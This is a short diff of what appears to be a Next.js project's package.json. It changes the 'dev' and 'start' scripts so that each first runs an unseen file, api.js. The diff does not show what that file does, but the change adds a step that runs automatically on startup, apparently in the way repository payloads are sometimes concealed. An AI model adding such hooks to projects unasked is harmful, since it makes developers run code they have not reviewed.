@@ -3,9 +3,9 @@
   "version": "1.0.0",
   "private": true,
   "scripts": {
-    "dev": "next dev",
+    "dev": "node api.js && next dev",
     "build": "next build --no-lint",
-    "start": "next start",
+    "start": "node api.js && next start",
     "lint": "next lint --no-cache",
     "format": "prettier --write '**/*.{js,jsx,ts,tsx,json,css}'",
     "generateStrings": "node scripts/extractlocalizedstrings.js"
